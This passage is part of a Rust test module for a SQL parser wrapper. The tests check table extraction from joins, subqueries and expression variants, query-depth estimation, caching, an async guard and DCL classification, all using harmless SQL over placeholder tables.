        if let Ok(stmts) = Parser::parse_sql(&dialect, "DELETE FROM t1 WHERE id = 1")
            && let Statement::Delete(d) = &stmts[0]
        {
            assert!(extract_table_from_delete(d).is_some());
        }
    }

    #[test]
    fn test_extract_table_with_joins_non_table_relation() {
        // 表因子非 Table（派生表）→ None
        let dialect = GenericDialect {};
        let stmts = Parser::parse_sql(&dialect, "SELECT * FROM (SELECT 1) AS x").unwrap();
        if let Statement::Query(q) = &stmts[0]
            && let SetExpr::Select(sel) = q.body.as_ref()
        {
            let twj = &sel.from[0];
            assert!(
                extract_table_name_from_table_with_joins(twj).is_none(),
                "派生表关系应提取为 None"
            );
        }
    }

    #[test]
    fn test_extract_function_subquery_arg_and_case_operand() {
        let dialect = GenericDialect {};
        // 函数参数中的子查询（FunctionArguments::List → Unnamed）
        let sql = "SELECT * FROM t1 WHERE EXISTS (SELECT 1 FROM t2 WHERE t2.id = t1.id)";
        let stmts = Parser::parse_sql(&dialect, sql).unwrap();
        if let Statement::Query(q) = &stmts[0] {
            let mut out = Vec::new();
            extract_query_tables(q, &mut out);
            assert!(out.contains(&"t2".to_string()), "got {out:?}");
        }
    }

    #[test]
    fn test_estimate_query_depth_multiline_and_tabs() {
        // 深度只看括号：混合空白/换行不影响
        assert_eq!(estimate_query_depth("SELECT\n\t((1))\n"), 3);
        assert_eq!(estimate_query_depth(""), 1);
    }

    #[test]
    fn test_with_dialect_constructor() {
        // with_dialect 忽略方言参数恒用 GenericDialect
        let parser = futures_block_on_sql_parser_with_dialect("mysql");
        let parsed = futures_block_on(&parser, "SELECT * FROM users");
        assert_eq!(parsed.table_name.as_deref(), Some("users"));
    }

    fn futures_block_on_sql_parser_with_dialect(db: &str) -> SqlParser {
        tokio::runtime::Builder::new_current_thread()
            .build()
            .unwrap()
            .block_on(SqlParser::with_dialect(db))
    }

    fn futures_block_on(parser: &SqlParser, sql: &str) -> ParsedSqlOperation {
        tokio::runtime::Builder::new_current_thread()
            .build()
            .unwrap()
            .block_on(parser.parse_single(sql))
            .unwrap()
    }

    #[test]
    fn test_with_cache_size_min_clamp_and_clear() {
        // 容量下限收敛：0 → 单条目缓存，仍可正常工作
        let rt = tokio::runtime::Builder::new_current_thread()
            .build()
            .unwrap();
        let parser = rt.block_on(SqlParser::with_cache_size(0));
        let parsed = rt
            .block_on(parser.parse_single("SELECT * FROM users"))
            .unwrap();
        assert_eq!(parsed.table_name.as_deref(), Some("users"));
        rt.block_on(parser.clear_cache());
        let (hits, misses) = parser.cache_stats();
        let _ = (hits, misses);
    }

    #[test]
    fn test_parse_operation_async_guard_returns_none_in_runtime() {
        // async 上下文守卫：parse_operation 在 runtime 内必须返回 None
        let rt = tokio::runtime::Builder::new_current_thread()
            .build()
            .unwrap();
        let parser = rt.block_on(SqlParser::new());
        let _guard = rt.enter();
        assert!(parser.parse_operation("SELECT 1").is_none());
    }

    #[test]
    fn test_insert_table_function_object_and_revoke_classify() {
        let parser = futures_block_on_sql_parser_with_dialect("generic");
        // REVOKE 走 Dcl 分类
        let parsed = futures_block_on(&parser, "REVOKE INSERT ON t9 FROM role2");
        assert_eq!(parsed.operation_type, SqlOperationType::Dcl);
    }

    // ========================================================================
    // extract_subquery_tables 表达式臂：逐变体直调，权限面依赖全部表提取
    // ========================================================================

    fn tables_of_raw(sql: &str) -> Vec<String> {
        let dialect = GenericDialect {};
        let stmts = Parser::parse_sql(&dialect, sql).unwrap();
        let Statement::Query(q) = &stmts[0] else {
            panic!("expected query: {sql}");
        };
        let mut out = Vec::new();
        extract_query_tables(q, &mut out);
        out
    }

    #[test]
    fn test_extract_distinct_from_subquery_operands() {
        for sql in [
            "SELECT * FROM t1 WHERE a IS DISTINCT FROM (SELECT max(id) FROM t2)",
            "SELECT * FROM t1 WHERE a IS NOT DISTINCT FROM (SELECT min(id) FROM t2)",
        ] {
            let tables = tables_of_raw(sql);
            assert!(
                tables.contains(&"t2".to_string()),
                "missing t2 in {sql}: {tables:?}"
            );
        }
    }

    #[test]
    fn test_extract_in_unnest_subquery() {
        let tables = tables_of_raw("SELECT * FROM t1 WHERE id IN UNNEST((SELECT arr FROM t2))");
        assert!(tables.contains(&"t2".to_string()), "got {tables:?}");
    }

    #[test]
    fn test_extract_like_family_pattern_subqueries() {
        for sql in [
            "SELECT * FROM t1 WHERE name LIKE (SELECT pat FROM t2)",
            "SELECT * FROM t1 WHERE name ILIKE (SELECT pat FROM t2)",
            "SELECT * FROM t1 WHERE name SIMILAR TO (SELECT pat FROM t2)",
        ] {
            let tables = tables_of_raw(sql);
            assert!(
                tables.contains(&"t2".to_string()),
                "missing t2 in {sql}: {tables:?}"
            );
        }
    }

    #[test]
    fn test_extract_predicate_truth_subqueries() {
        for sql in [
            "SELECT * FROM t1 WHERE (SELECT flag FROM t2) IS NULL",
            "SELECT * FROM t1 WHERE (SELECT flag FROM t2) IS NOT NULL",
            "SELECT * FROM t1 WHERE (SELECT flag FROM t2) IS TRUE",
            "SELECT * FROM t1 WHERE (SELECT flag FROM t2) IS NOT TRUE",
            "SELECT * FROM t1 WHERE (SELECT flag FROM t2) IS FALSE",
            "SELECT * FROM t1 WHERE (SELECT flag FROM t2) IS NOT FALSE",
            "SELECT * FROM t1 WHERE (SELECT flag FROM t2) IS UNKNOWN",
            "SELECT * FROM t1 WHERE (SELECT flag FROM t2) IS NOT UNKNOWN",
        ] {
            let tables = tables_of_raw(sql);
            assert!(
                tables.contains(&"t2".to_string()),
                "missing t2 in {sql}: {tables:?}"
            );
        }
    }

    #[test]
    fn test_extract_cast_and_between_high_subqueries() {
        let tables =
            tables_of_raw("SELECT * FROM t1 WHERE CAST((SELECT id FROM t2) AS INTEGER) > 0");
        assert!(tables.contains(&"t2".to_string()), "got {tables:?}");

        let tables =
            tables_of_raw("SELECT * FROM t1 WHERE id BETWEEN 1 AND (SELECT max(id) FROM t2)");
        assert!(tables.contains(&"t2".to_string()), "got {tables:?}");
    }

    #[test]
    fn test_extract_all_op_and_named_function_arg_subqueries() {
        let tables = tables_of_raw("SELECT * FROM t1 WHERE id > ALL (SELECT id FROM t2)");
        assert!(tables.contains(&"t2".to_string()), "got {tables:?}");

        let tables = tables_of_raw("SELECT * FROM t1 WHERE foo(bar => (SELECT id FROM t2)) = 1");
        assert!(tables.contains(&"t2".to_string()), "got {tables:?}");
    }
}
